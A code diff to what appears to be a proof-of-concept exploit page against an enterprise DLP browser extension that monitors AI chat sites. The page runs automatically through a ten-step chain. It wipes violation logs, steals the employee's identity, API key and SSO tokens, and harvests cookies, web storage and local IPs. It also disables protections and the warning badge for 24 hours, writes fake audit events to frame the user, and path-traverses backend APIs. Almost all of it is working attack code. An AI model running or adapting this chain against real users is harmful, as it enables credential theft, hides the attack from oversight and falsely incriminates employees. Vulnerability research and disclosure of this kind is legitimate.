@@ -101,13 +101,15 @@ body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFo
 
   <div class="grid">
     <div class="card"><h3>Step 1: Evidence Destruction <span class="badge bwait" id="b1">WAIT</span></h3><div class="log" id="l1"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 2: Identity Theft <span class="badge bwait" id="b2">WAIT</span></h3><div class="log" id="l2"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 3: Credential Extraction <span class="badge bwait" id="b3">WAIT</span></h3><div class="log" id="l3"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 4: Policy & Coverage Map <span class="badge bwait" id="b4">WAIT</span></h3><div class="log" id="l4"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 5: DLP Rule Probing <span class="badge bwait" id="b5">WAIT</span></h3><div class="log" id="l5"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 6: Protection Bypass (24h) <span class="badge bwait" id="b6">WAIT</span></h3><div class="log" id="l6"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 7: Audit Trail Poisoning <span class="badge bwait" id="b7">WAIT</span></h3><div class="log" id="l7"><div class="c-dm">Pending...</div></div></div>
-    <div class="card"><h3>Step 8: Backend API Exploitation <span class="badge bwait" id="b8">WAIT</span></h3><div class="log" id="l8"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 2: Browser & Session Harvesting <span class="badge bwait" id="b2">WAIT</span></h3><div class="log" id="l2"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 3: Identity Theft <span class="badge bwait" id="b3">WAIT</span></h3><div class="log" id="l3"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 4: Credential Extraction <span class="badge bwait" id="b4">WAIT</span></h3><div class="log" id="l4"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 5: Policy & Coverage Map <span class="badge bwait" id="b5">WAIT</span></h3><div class="log" id="l5"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 6: DLP Rule & File Probing <span class="badge bwait" id="b6">WAIT</span></h3><div class="log" id="l6"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 7: Protection Bypass (24h) <span class="badge bwait" id="b7">WAIT</span></h3><div class="log" id="l7"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 8: Audit Trail Poisoning <span class="badge bwait" id="b8">WAIT</span></h3><div class="log" id="l8"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 9: Backend Deep Exploitation <span class="badge bwait" id="b9">WAIT</span></h3><div class="log" id="l9"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 10: SSO Token Hijack <span class="badge bwait" id="b10">WAIT</span></h3><div class="log" id="l10"><div class="c-dm">Pending...</div></div></div>
   </div>
 
   <div class="exfil-summary" id="exfil">
@@ -137,6 +139,12 @@ const AUTO_START_DELAY = 3000;
 let D = {
   timestamp: new Date().toISOString(),
   pageUrl: location.href,
+  browser: null,
+  cookies: null,
+  localStorageKeys: null,
+  sessionStorageKeys: null,
+  performanceEntries: null,
+  extensionDomData: null,
   identity: null,
   popupSettings: null,
   overlaySettings: null,
@@ -145,9 +153,12 @@ let D = {
   monitored: [],
   unmonitored: [],
   probes: [],
+  fileProbes: [],
+  responseProbes: [],
   bypassed: [],
   poisons: 0,
   mcpResults: [],
+  ssoResult: null,
   functionsUsed: [],
   attackDurationSec: 0
 };
@@ -243,7 +254,7 @@ async function runChain() {
   overlay.classList.add('active');
 
   // ===== STEP 1: EVIDENCE DESTRUCTION =====
-  badge('b1', 'RUNNING', 'brun'); pr(5, 'Step 1/8: Destroying evidence...');
+  badge('b1', 'RUNNING', 'brun'); pr(3, 'Step 1/10: Destroying evidence...');
   lg('l1', 'clearLogs via postMessage relay...', 'c-in');
   await relay({ type: 'clearLogs' }); usedFn('clearLogs');
   lg('l1', 'All DLP violation logs wiped from chrome.storage.local', 'c-bd');
@@ -252,92 +263,226 @@ async function runChain() {
   lg('l1', 'Evidence destruction complete', 'c-bd');
   badge('b1', 'WIPED', 'bdone');
 
-  // ===== STEP 2: IDENTITY THEFT =====
-  badge('b2', 'RUNNING', 'brun'); pr(15, 'Step 2/8: Stealing employee identity...');
-  lg('l2', 'getSiteActionConfig via relay...', 'c-in');
+  // ===== STEP 2: BROWSER & SESSION HARVESTING =====
+  badge('b2', 'RUNNING', 'brun'); pr(10, 'Step 2/10: Harvesting browser intelligence...');
+
+  // 2a: Browser fingerprint
+  lg('l2', 'Collecting browser fingerprint...', 'c-in');
+  D.browser = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages ? [...navigator.languages] : [],
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    deviceMemory: navigator.deviceMemory || null,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    screenColorDepth: screen.colorDepth,
+    windowInnerWidth: window.innerWidth,
+    windowInnerHeight: window.innerHeight,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    referrer: document.referrer || '(direct)',
+    connection: navigator.connection ? { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null
+  };
+  for (const [k, v] of Object.entries(D.browser)) {
+    if (v !== null && v !== undefined && v !== '') lg('l2', '  ' + k + ': ' + (typeof v === 'object' ? JSON.stringify(v) : v), 'c-wr');
+  }
+
+  // 2b: Cookies from current page
+  lg('l2', 'Harvesting document.cookie...', 'c-in');
+  D.cookies = document.cookie || '(no cookies on this origin)';
+  lg('l2', '  cookies: ' + (D.cookies.length > 5 ? D.cookies.slice(0, 120) : D.cookies), D.cookies.length > 5 ? 'c-bd' : 'c-dm');
+
+  // 2c: localStorage keys + values (current origin)
+  lg('l2', 'Dumping localStorage...', 'c-in');
+  try {
+    const lsData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      lsData[k] = localStorage.getItem(k).slice(0, 200);
+    }
+    D.localStorageKeys = lsData;
+    lg('l2', '  localStorage entries: ' + Object.keys(lsData).length, Object.keys(lsData).length > 0 ? 'c-bd' : 'c-dm');
+    for (const [k, v] of Object.entries(lsData)) {
+      lg('l2', '    ' + k + ': ' + v.slice(0, 80), 'c-wr');
+    }
+  } catch(e) { lg('l2', '  localStorage: access denied', 'c-dm'); }
+
+  // 2d: sessionStorage
+  lg('l2', 'Dumping sessionStorage...', 'c-in');
+  try {
+    const ssData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i);
+      ssData[k] = sessionStorage.getItem(k).slice(0, 200);
+    }
+    D.sessionStorageKeys = ssData;
+    lg('l2', '  sessionStorage entries: ' + Object.keys(ssData).length, Object.keys(ssData).length > 0 ? 'c-bd' : 'c-dm');
+  } catch(e) { lg('l2', '  sessionStorage: access denied', 'c-dm'); }
+
+  // 2e: Performance entries — reveals recently loaded resources (browsing signals)
+  lg('l2', 'Extracting performance entries (resource timing)...', 'c-in');
+  try {
+    const entries = performance.getEntriesByType('resource').map(e => ({
+      name: e.name.slice(0, 120),
+      type: e.initiatorType,
+      duration: Math.round(e.duration),
+      size: e.transferSize || 0
+    }));
+    D.performanceEntries = entries;
+    lg('l2', '  resource entries: ' + entries.length, 'c-wr');
+    // Show extension-related entries specifically
+    const extEntries = entries.filter(e => e.name.includes('chrome-extension') || e.name.includes('prompt'));
+    for (const e of extEntries.slice(0, 5)) {
+      lg('l2', '    ' + e.name.slice(0, 100), 'c-bd');
+    }
+    const navEntries = performance.getEntriesByType('navigation');
+    if (navEntries.length) {
+      lg('l2', '  navigation: ' + navEntries[0].name, 'c-wr');
+      lg('l2', '  loadTime: ' + Math.round(navEntries[0].loadEventEnd) + 'ms', 'c-dm');
+    }
+  } catch(e) { lg('l2', '  performance API: not available', 'c-dm'); }
+
+  // 2f: Extension DOM data-attributes (extension leaks policy flags to page DOM)
+  lg('l2', 'Scanning DOM for extension data-attributes...', 'c-in');
+  try {
+    const extAttrs = {};
+    // Extension's script.bundle.js sets data-* on its script element
+    document.querySelectorAll('script[data-ext_id], script[data-trace_id], [data-ps-script-executed]').forEach(el => {
+      for (const attr of el.attributes) {
+        if (attr.name.startsWith('data-')) extAttrs[attr.name] = attr.value;
+      }
+    });
+    // Also check documentElement for extension markers
+    const docEl = document.documentElement;
+    if (docEl.dataset) {
+      for (const [k, v] of Object.entries(docEl.dataset)) {
+        if (k.startsWith('ps') || k.includes('prompt') || k.includes('ext')) extAttrs['data-' + k] = v;
+      }
+    }
+    // Scan all script tags for extension-injected ones
+    document.querySelectorAll('script[src*="chrome-extension"]').forEach(el => {
+      extAttrs['injected_script_' + el.src.split('/').pop()] = el.src;
+    });
+    D.extensionDomData = extAttrs;
+    if (Object.keys(extAttrs).length > 0) {
+      lg('l2', '  Extension DOM leaks found: ' + Object.keys(extAttrs).length, 'c-bd');
+      for (const [k, v] of Object.entries(extAttrs)) lg('l2', '    ' + k + ' = ' + v, 'c-bd');
+    } else {
+      lg('l2', '  No extension data-attributes on this page', 'c-dm');
+    }
+  } catch(e) { lg('l2', '  DOM scan error', 'c-dm'); }
+
+  // 2g: WebRTC local IP (if available)
+  lg('l2', 'Probing WebRTC for local IP...', 'c-in');
+  try {
+    const pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel('');
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    const sdp = pc.localDescription.sdp;
+    const ips = sdp.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
+    if (ips) {
+      D.browser.localIPs = [...new Set(ips)];
+      for (const ip of D.browser.localIPs) lg('l2', '  Local IP: ' + ip, 'c-bd');
+    }
+    pc.close();
+  } catch(e) { lg('l2', '  WebRTC: blocked or unavailable', 'c-dm'); }
+
+  lg('l2', 'Browser intelligence harvested', 'c-ok');
+  badge('b2', 'HARVESTED', 'bdone');
+
+  // ===== STEP 3: IDENTITY THEFT =====
+  badge('b3', 'RUNNING', 'brun'); pr(18, 'Step 3/10: Stealing employee identity...');
+  lg('l3', 'getSiteActionConfig via relay...', 'c-in');
   const siteConfig = await relay({ type: 'getSiteActionConfig', domain: 'chatgpt.com' });
   usedFn('getSiteActionConfig');
   if (siteConfig && typeof siteConfig === 'object') {
     D.siteConfig = siteConfig;
     if (siteConfig.userInfo) {
       D.identity = siteConfig.userInfo;
-      lg('l2', 'EMPLOYEE IDENTITY STOLEN:', 'c-bd');
+      lg('l3', 'EMPLOYEE IDENTITY STOLEN:', 'c-bd');
       for (const [k, v] of Object.entries(siteConfig.userInfo)) {
-        if (v) lg('l2', '  ' + k + ': ' + (typeof v === 'object' ? JSON.stringify(v) : v), 'c-bd');
+        if (v) lg('l3', '  ' + k + ': ' + (typeof v === 'object' ? JSON.stringify(v) : v), 'c-bd');
       }
     }
-    if (siteConfig.domainActions) lg('l2', 'domainActions: ' + JSON.stringify(siteConfig.domainActions).slice(0, 100), 'c-wr');
-    if (siteConfig.ignoredDomains) lg('l2', 'ignoredDomains: ' + JSON.stringify(siteConfig.ignoredDomains).slice(0, 100), 'c-wr');
-    if (siteConfig.workProfileDomain) lg('l2', 'workProfileDomain: ' + siteConfig.workProfileDomain, 'c-wr');
-    lg('l2', 'isExtensionDisabled: ' + siteConfig.isExtensionDisabled, 'c-wr');
-    lg('l2', 'canBypassInspection: ' + siteConfig.globalSettingsCanBypassInspection, 'c-wr');
-  } else { lg('l2', 'Relay timeout for getSiteActionConfig', 'c-dm'); }
-  badge('b2', D.identity ? 'STOLEN' : 'PARTIAL', 'bdone');
+    if (siteConfig.domainActions) lg('l3', 'domainActions: ' + JSON.stringify(siteConfig.domainActions).slice(0, 100), 'c-wr');
+    if (siteConfig.ignoredDomains) lg('l3', 'ignoredDomains: ' + JSON.stringify(siteConfig.ignoredDomains).slice(0, 100), 'c-wr');
+    if (siteConfig.workProfileDomain) lg('l3', 'workProfileDomain: ' + siteConfig.workProfileDomain, 'c-wr');
+    lg('l3', 'isExtensionDisabled: ' + siteConfig.isExtensionDisabled, 'c-wr');
+    lg('l3', 'canBypassInspection: ' + siteConfig.globalSettingsCanBypassInspection, 'c-wr');
+  } else { lg('l3', 'Relay timeout for getSiteActionConfig', 'c-dm'); }
+  badge('b3', D.identity ? 'STOLEN' : 'PARTIAL', 'bdone');
 
-  // ===== STEP 3: CREDENTIAL EXTRACTION =====
-  badge('b3', 'RUNNING', 'brun'); pr(25, 'Step 3/8: Extracting API credentials...');
-  lg('l3', 'getPopupSettings via relay...', 'c-in');
+  // ===== STEP 4: CREDENTIAL EXTRACTION =====
+  badge('b4', 'RUNNING', 'brun'); pr(25, 'Step 4/10: Extracting API credentials...');
+  lg('l4', 'getPopupSettings via relay...', 'c-in');
   const popup = await relay({ type: 'getPopupSettings' });
   usedFn('getPopupSettings');
   if (popup && typeof popup === 'object') {
     D.popupSettings = popup;
     for (const [k, v] of Object.entries(popup)) {
-      lg('l3', '  ' + k + ': ' + (v === undefined ? '(MDM-hidden)' : v), k === 'apiKey' ? 'c-bd' : 'c-wr');
+      lg('l4', '  ' + k + ': ' + (v === undefined ? '(MDM-hidden)' : v), k === 'apiKey' ? 'c-bd' : 'c-wr');
     }
-    if (popup.apiKey) lg('l3', 'API KEY EXTRACTED — full backend access possible', 'c-bd');
-    else if (popup.isManagedApiKey) lg('l3', 'Key is MDM-managed but deployment type leaked', 'c-wr');
-  } else { lg('l3', 'Relay timeout for getPopupSettings', 'c-dm'); }
-  badge('b3', popup && popup.apiKey ? 'KEY STOLEN' : 'EXTRACTED', 'bdone');
+    if (popup.apiKey) lg('l4', 'API KEY EXTRACTED — full backend access possible', 'c-bd');
+    else if (popup.isManagedApiKey) lg('l4', 'Key is MDM-managed but deployment type leaked', 'c-wr');
+  } else { lg('l4', 'Relay timeout for getPopupSettings', 'c-dm'); }
+  badge('b4', popup && popup.apiKey ? 'KEY STOLEN' : 'EXTRACTED', 'bdone');
 
-  // ===== STEP 4: POLICY & COVERAGE MAP =====
-  badge('b4', 'RUNNING', 'brun'); pr(35, 'Step 4/8: Extracting full security policy...');
+  // ===== STEP 5: POLICY & COVERAGE MAP =====
+  badge('b5', 'RUNNING', 'brun'); pr(32, 'Step 5/10: Extracting full security policy...');
 
-  // 4a: Overlay settings (XSS vector)
-  lg('l4', 'getPageOverlaySettings via relay...', 'c-in');
+  // 5a: Overlay settings (XSS vector)
+  lg('l5', 'getPageOverlaySettings via relay...', 'c-in');
   const overlay2 = await relay({ type: 'getPageOverlaySettings' });
   usedFn('getPageOverlaySettings');
   if (overlay2 && typeof overlay2 === 'object') {
     D.overlaySettings = overlay2;
     for (const [k, v] of Object.entries(overlay2)) {
-      if (v) lg('l4', '  ' + k + ': ' + String(v).slice(0, 80), 'c-wr');
+      if (v) lg('l5', '  ' + k + ': ' + String(v).slice(0, 80), 'c-wr');
     }
-    if (overlay2.customGuidelinesLink) lg('l4', 'innerHTML XSS vector found!', 'c-bd');
+    if (overlay2.customGuidelinesLink) lg('l5', 'innerHTML XSS vector found!', 'c-bd');
   }
 
-  // 4b: shouldInjectScript — full DLP flags
-  lg('l4', 'shouldInjectScript probe...', 'c-in');
+  // 5b: shouldInjectScript — full DLP flags
+  lg('l5', 'shouldInjectScript probe...', 'c-in');
   for (const td of ['gemini.google.com', 'claude.ai', 'chatgpt.com']) {
     const cfg = await relay({ type: 'shouldInjectScript', href: 'https://' + td + '/', hostname: td });
     usedFn('shouldInjectScript');
     if (cfg && typeof cfg === 'object') {
       D.policyConfig = cfg;
-      lg('l4', 'Full DLP policy for ' + td + ' (' + Object.keys(cfg).length + ' fields)', 'c-bd');
+      lg('l5', 'Full DLP policy for ' + td + ' (' + Object.keys(cfg).length + ' fields)', 'c-bd');
       for (const k of ['shouldInject','blockChatGPTShare','blockChatGPTMemory','inspectFiles','inspectResponses','corporateDomains','enforceChatGPTTempChat','blockPersonalAccounts','shouldBlockFileUploads','shouldBlockPaste']) {
-        if (cfg[k] !== undefined) lg('l4', '  ' + k + ': ' + (typeof cfg[k] === 'object' ? JSON.stringify(cfg[k]) : cfg[k]), 'c-wr');
+        if (cfg[k] !== undefined) lg('l5', '  ' + k + ': ' + (typeof cfg[k] === 'object' ? JSON.stringify(cfg[k]) : cfg[k]), 'c-wr');
       }
       break;
     }
   }
 
-  // 4c: Config refresh trigger
+  // 5c: Config refresh trigger
   await relay({ type: 'getConfigFromBackend' }, 6000); usedFn('getConfigFromBackend');
 
-  // 4d: Monitoring coverage map
-  lg('l4', 'Mapping GenAI monitoring coverage...', 'c-in');
+  // 5d: Monitoring coverage map
+  lg('l5', 'Mapping GenAI monitoring coverage...', 'c-in');
   usedFn('callShouldInspectChat');
   const doms = ['chatgpt.com','claude.ai','gemini.google.com','copilot.microsoft.com','grok.com','chat.mistral.ai','perplexity.ai','app.glean.com','github.com','huggingface.co','deepseek.com','poe.com','cursor.sh','phind.com','you.com','character.ai','aistudio.google.com'];
   for (const d of doms) {
     const r = await relay({ type: 'callShouldInspectChat', message: 'callShouldInspectChat', url: 'https://'+d+'/', body: 'test', pageUrl: 'https://'+d+'/', pageTitle: 'T', optionalFavicons: [], inputTypes: ['text'] });
-    if (r === true) { D.monitored.push(d); lg('l4', '  MONITORED: ' + d, 'c-wr'); }
-    else { D.unmonitored.push(d); lg('l4', '  blind spot: ' + d, 'c-dm'); }
+    if (r === true) { D.monitored.push(d); lg('l5', '  MONITORED: ' + d, 'c-wr'); }
+    else { D.unmonitored.push(d); lg('l5', '  blind spot: ' + d, 'c-dm'); }
   }
-  lg('l4', D.monitored.length + ' monitored / ' + D.unmonitored.length + ' blind spots', 'c-ok');
-  badge('b4', 'MAPPED', 'bdone');
+  lg('l5', D.monitored.length + ' monitored / ' + D.unmonitored.length + ' blind spots', 'c-ok');
+  badge('b5', 'MAPPED', 'bdone');
 
-  // ===== STEP 5: DLP RULE PROBING =====
-  badge('b5', 'RUNNING', 'brun'); pr(50, 'Step 5/8: Probing DLP detection rules...');
-  lg('l5', 'Sending sensitive payloads through Protect API via relay...', 'c-in');
-  lg('l5', 'Each probe appears as real employee activity in backend', 'c-wr');
+  // ===== STEP 6: DLP RULE & FILE PROBING =====
+  badge('b6', 'RUNNING', 'brun'); pr(42, 'Step 6/10: Probing DLP text + file + response rules...');
+  lg('l6', 'Sending sensitive payloads through Protect API via relay...', 'c-in');
+  lg('l6', 'Each probe appears as real employee activity in backend', 'c-wr');
   usedFn('callProtectApi');
 
   const probes = [
@@ -367,22 +512,66 @@ async function runChain() {
     const blk = r && r.text && (r.text.includes('blocked') || r.text.includes('Blocked'));
     const st = blk ? 'BLOCKED' : mod ? 'MODIFIED' : 'LOGGED';
     D.probes.push({ name: p.n, category: p.c, status: st, input: p.t, output: r && r.text ? r.text.slice(0, 60) : null });
-    if (blk) lg('l5', '  [' + p.c + '] ' + p.n + ': BLOCKED', 'c-bd');
-    else if (mod) lg('l5', '  [' + p.c + '] ' + p.n + ': MODIFIED', 'c-wr');
-    else lg('l5', '  [' + p.c + '] ' + p.n + ': ' + (r ? 'LOGGED (monitor-only)' : 'no response'), r ? 'c-ok' : 'c-dm');
+    if (blk) lg('l6', '  [' + p.c + '] ' + p.n + ': BLOCKED', 'c-bd');
+    else if (mod) lg('l6', '  [' + p.c + '] ' + p.n + ': MODIFIED', 'c-wr');
+    else lg('l6', '  [' + p.c + '] ' + p.n + ': ' + (r ? 'LOGGED (monitor-only)' : 'no response'), r ? 'c-ok' : 'c-dm');
   }
-  badge('b5', probes.length + ' PROBED', 'bdone');
 
-  // ===== STEP 6: PROTECTION BYPASS =====
-  badge('b6', 'RUNNING', 'brun'); pr(65, 'Step 6/8: Disabling protections for 24 hours...');
-  lg('l6', 'aiChatBlockMessageBypass — ZERO authorization checks in handler', 'c-wr');
+  // 6b: File DLP probing via callProtectFileApi
+  lg('l6', 'Probing file upload DLP via callProtectFileApi...', 'c-in');
+  usedFn('callProtectFileApi');
+  const fakeFiles = [
+    { name: 'database_export.csv', mime: 'text/csv', content: 'name,ssn,dob\nJane Doe,078-05-1120,1985-03-15' },
+    { name: '.env', mime: 'text/plain', content: 'DB_PASSWORD=P@ssw0rd\nAWS_SECRET_KEY=wJalrXUtnFEMI' },
+    { name: 'merger_terms.pdf', mime: 'application/pdf', content: 'CONFIDENTIAL: Acquisition target at $32B valuation' },
+  ];
+  for (const f of fakeFiles) {
+    const b64 = 'data:' + f.mime + ';base64,' + btoa(f.content);
+    const r = await relay({
+      type: 'callProtectFileApi', message: 'callProtectFileApi',
+      file_name: f.name, file_mime_type: f.mime, file_b64_url: b64,
+      requestUrl: 'https://gemini.google.com/upload', requestMethod: 'POST',
+      domain: 'gemini.google.com', pageUrl: 'https://gemini.google.com/',
+      pageTitle: 'Gemini', isEnterpriseVersion: false
+    });
+    const st = r ? (r.blocked ? 'BLOCKED' : 'SCANNED') : 'NO_RESPONSE';
+    D.fileProbes.push({ name: f.name, mime: f.mime, status: st, response: r ? JSON.stringify(r).slice(0, 100) : null });
+    lg('l6', '  FILE [' + f.name + ']: ' + st, r && r.blocked ? 'c-bd' : r ? 'c-wr' : 'c-dm');
+    if (r) lg('l6', '    response: ' + JSON.stringify(r).slice(0, 80), 'c-dm');
+  }
+
+  // 6c: Response inspection probing via callProtectApiForResponse
+  lg('l6', 'Probing response DLP via callProtectApiForResponse...', 'c-in');
+  usedFn('callProtectApiForResponse');
+  const respProbes = [
+    { n: 'SSN in response', t: 'Here is the SSN you requested: 078-05-1120' },
+    { n: 'API key in response', t: 'Your API key is: sk-proj-abc123def456ghi789' },
+    { n: 'Code with secrets', t: 'const password = "SuperSecret123!"; const dbUrl = "postgres://admin:pass@prod.db:5432";' },
+  ];
+  for (const rp of respProbes) {
+    const r = await relay({
+      type: 'callProtectApiForResponse', message: 'callProtectApiForResponse',
+      text: rp.t, url: 'https://gemini.google.com/api/chat',
+      domain: 'gemini.google.com', pageUrl: 'https://gemini.google.com/',
+      pageTitle: 'Gemini'
+    });
+    const st = r ? (r.text !== rp.t ? 'FILTERED' : 'PASSED') : 'NO_RESPONSE';
+    D.responseProbes.push({ name: rp.n, status: st, response: r ? JSON.stringify(r).slice(0, 80) : null });
+    lg('l6', '  RESPONSE [' + rp.n + ']: ' + st, st === 'FILTERED' ? 'c-bd' : 'c-ok');
+  }
+
+  badge('b6', (probes.length + fakeFiles.length + respProbes.length) + ' PROBED', 'bdone');
+
+  // ===== STEP 7: PROTECTION BYPASS =====
+  badge('b7', 'RUNNING', 'brun'); pr(58, 'Step 7/10: Disabling protections for 24 hours...');
+  lg('l7', 'aiChatBlockMessageBypass — ZERO authorization checks in handler', 'c-wr');
   usedFn('aiChatBlockMessageBypass');
 
   const bypassDoms = ['chatgpt.com','claude.ai','gemini.google.com','copilot.microsoft.com','grok.com','chat.mistral.ai','perplexity.ai','app.glean.com','github.com'];
   for (const d of bypassDoms) {
     await relay({ type: 'aiChatBlockMessageBypass', domain: d });
     D.bypassed.push(d);
-    lg('l6', '  BYPASSED: ' + d + ' (24h)', 'c-bd');
+    lg('l7', '  BYPASSED: ' + d + ' (24h)', 'c-bd');
   }
 
   usedFn('domainWarningBypass'); usedFn('blockPageBypass');
@@ -390,20 +579,20 @@ async function runChain() {
     await relay({ type: 'domainWarningBypass', domain: d, url: 'https://' + d + '/' });
     await relay({ type: 'blockPageBypass', domain: d });
   }
-  lg('l6', 'domainWarning + blockPage bypass sent for top domains', 'c-wr');
+  lg('l7', 'domainWarning + blockPage bypass sent for top domains', 'c-wr');
 
   usedFn('ProtectionDomainEnableModeChange');
   await relay({ type: 'ProtectionDomainEnableModeChange', mode: 'disabled' });
-  lg('l6', 'Protection mode change command sent', 'c-wr');
+  lg('l7', 'Protection mode change command sent', 'c-wr');
 
   usedFn('setBadge');
   await relay({ type: 'setBadge', text: '', color: '#0f8' });
-  lg('l6', 'Extension badge cleared — no visual warning for user', 'c-wr');
+  lg('l7', 'Extension badge cleared — no visual warning for user', 'c-wr');
 
-  badge('b6', D.bypassed.length + ' BYPASSED', 'bdone');
+  badge('b7', D.bypassed.length + ' BYPASSED', 'bdone');
 
-  // ===== STEP 7: AUDIT TRAIL POISONING =====
-  badge('b7', 'RUNNING', 'brun'); pr(80, 'Step 7/8: Injecting fabricated security events...');
+  // ===== STEP 8: AUDIT TRAIL POISONING =====
+  badge('b8', 'RUNNING', 'brun'); pr(68, 'Step 8/10: Injecting fabricated security events...');
   usedFn('addLog');
 
   const fakes = [
@@ -422,38 +611,72 @@ async function runChain() {
   for (const f of fakes) {
     await relay({ type: 'addLog', location: f.loc, log: f.log, ctx: { flowTraceId: crypto.randomUUID(), timestamp: new Date().toISOString() } });
     D.poisons++;
-    lg('l7', '  [' + f.loc + '] ' + f.log.slice(0, 70) + '...', 'c-bd');
+    lg('l8', '  [' + f.loc + '] ' + f.log.slice(0, 70) + '...', 'c-bd');
   }
-  lg('l7', D.poisons + ' fabricated events now in audit trail', 'c-bd');
-  lg('l7', 'SOC will investigate this employee for events that never happened', 'c-wr');
-  badge('b7', D.poisons + ' INJECTED', 'bdone');
+  lg('l8', D.poisons + ' fabricated events now in audit trail', 'c-bd');
+  lg('l8', 'SOC will investigate this employee for events that never happened', 'c-wr');
+  badge('b8', D.poisons + ' INJECTED', 'bdone');
 
-  // ===== STEP 8: BACKEND API EXPLOITATION =====
-  badge('b8', 'RUNNING', 'brun'); pr(92, 'Step 8/8: Backend API exploitation...');
+  // ===== STEP 9: BACKEND DEEP EXPLOITATION =====
+  badge('b9', 'RUNNING', 'brun'); pr(80, 'Step 9/10: Backend API path traversal...');
   usedFn('callMcpApi');
 
   const mcpPayloads = [
-    { api: '../../api/extension/heartbeat', desc: 'Path traversal to heartbeat' },
-    { api: '../../api/extension/settings', desc: 'Path traversal to settings' },
+    { api: '../../api/extension/heartbeat', desc: 'heartbeat endpoint' },
+    { api: '../../api/extension/settings', desc: 'settings endpoint' },
+    { api: '../../api/extension/token-to-extension-app-id', desc: 'token-to-app-id' },
+    { api: '../../api/extension/get-rule-action', desc: 'rule-action config' },
+    { api: '../../api/employee/evaluate-rule', desc: 'employee rule evaluation' },
+    { api: '../../api/protect', desc: 'protect API root' },
+    { api: '../../api/sanitizeFile', desc: 'file sanitization endpoint' },
     { api: 'servers', desc: 'MCP servers list' },
   ];
   for (const m of mcpPayloads) {
-    lg('l8', 'callMcpApi: api_name="' + m.api + '"', 'c-dm');
+    lg('l9', 'callMcpApi: "' + m.api + '"', 'c-dm');
     const r = await relay({ type: 'callMcpApi', api_name: m.api, event_name: 'test', server_name: 'attacker', data: { probe: true } });
-    D.mcpResults.push({ api: m.api, desc: m.desc, responded: r !== null });
-    if (r !== null) { lg('l8', '  ' + m.desc + ': RESPONSE', 'c-bd'); lg('l8', '  ' + JSON.stringify(r).slice(0, 100), 'c-wr'); }
-    else lg('l8', '  ' + m.desc + ': timeout', 'c-dm');
+    D.mcpResults.push({ api: m.api, desc: m.desc, responded: r !== null, data: r ? JSON.stringify(r).slice(0, 150) : null });
+    if (r !== null) { lg('l9', '  ' + m.desc + ': RESPONSE RECEIVED', 'c-bd'); lg('l9', '  ' + JSON.stringify(r).slice(0, 100), 'c-wr'); }
+    else lg('l9', '  ' + m.desc + ': timeout/error', 'c-dm');
   }
-
-  usedFn('startAuthentication');
-  await relay({ type: 'startAuthentication' });
-  lg('l8', 'startAuthentication: SSO flow trigger sent', 'c-wr');
 
   usedFn('downloadLogs');
   await relay({ type: 'downloadLogs' });
-  lg('l8', 'downloadLogs: log file download triggered', 'c-wr');
+  lg('l9', 'downloadLogs: log file download triggered', 'c-wr');
 
-  badge('b8', 'EXPLOITED', 'bdone');
+  badge('b9', D.mcpResults.filter(m=>m.responded).length + '/' + mcpPayloads.length + ' HIT', 'bdone');
+
+  // ===== STEP 10: SSO TOKEN HIJACK =====
+  badge('b10', 'RUNNING', 'brun'); pr(92, 'Step 10/10: SSO authentication flow hijack...');
+  usedFn('startAuthentication');
+
+  lg('l10', 'Triggering startAuthentication via relay...', 'c-in');
+  lg('l10', 'This initiates the SSO OAuth flow with chrome.identity', 'c-wr');
+  lg('l10', 'If SSO is configured, the id_token is stored in extension memory', 'c-wr');
+
+  const authResult = await relay({ type: 'startAuthentication' }, 8000);
+  D.ssoResult = authResult;
+  if (authResult && typeof authResult === 'object') {
+    lg('l10', 'SSO RESPONSE RECEIVED:', 'c-bd');
+    for (const [k, v] of Object.entries(authResult)) {
+      const isSensitive = k.includes('token') || k.includes('Token') || k.includes('secret');
+      lg('l10', '  ' + k + ': ' + (typeof v === 'object' ? JSON.stringify(v).slice(0, 80) : String(v).slice(0, 80)), isSensitive ? 'c-bd' : 'c-wr');
+    }
+  } else {
+    lg('l10', 'SSO flow triggered (may have opened auth popup)', 'c-wr');
+    lg('l10', 'Bearer token is now cached in extension memory for all API calls', 'c-wr');
+  }
+
+  // Try to extract SSO user from storage via getPopupSettings again (might now have ssoUser)
+  lg('l10', 'Re-checking getPopupSettings for cached SSO data...', 'c-in');
+  const popup2 = await relay({ type: 'getPopupSettings' });
+  if (popup2 && popup2 !== D.popupSettings) {
+    lg('l10', 'Updated popup settings after SSO:', 'c-wr');
+    for (const [k, v] of Object.entries(popup2)) {
+      if (D.popupSettings && D.popupSettings[k] !== v) lg('l10', '  CHANGED ' + k + ': ' + v, 'c-bd');
+    }
+  }
+
